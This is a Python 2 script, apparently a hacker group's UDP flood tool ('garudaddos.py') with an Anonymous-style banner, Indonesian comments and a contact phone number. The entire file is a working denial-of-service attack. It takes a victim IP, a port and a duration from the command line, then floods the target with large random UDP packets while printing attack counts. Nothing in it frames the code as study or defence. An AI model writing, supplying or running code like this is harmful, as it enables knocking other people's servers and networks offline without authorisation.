#!bin/user/python
import time
import socket
import random
import sys
import os
os.system("clear")
def usage():
    print "####################[\033[1;91mA N O N Y M O U033[1;32m]S#################"
    print ".............. \033[1;91mAuthor : TigerCyberGaruda................"
    print ".....Github : https://github.com/TigerCyberGaruda....."
    print "........Contact : https://wa.me/+6281331369655........"
    print ".............Team : Cyber Garuda Xploiter............."
    print "#####################EXPECT US########################\033[1;32m"
def flood(victim, vport, duration):
    # Jangan lupa follow github kami : TigerCyberGaruda
    # Jika Ip yang kalian masukkan salah garudaddos.py tidak akan berfungsi dikarenakan url/Ip tidak ditemukan
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 300000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mAttack \033[1;32m%s \033[1;91mServer \033[1;32m%s \033[1;91mPort \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
    usage()
#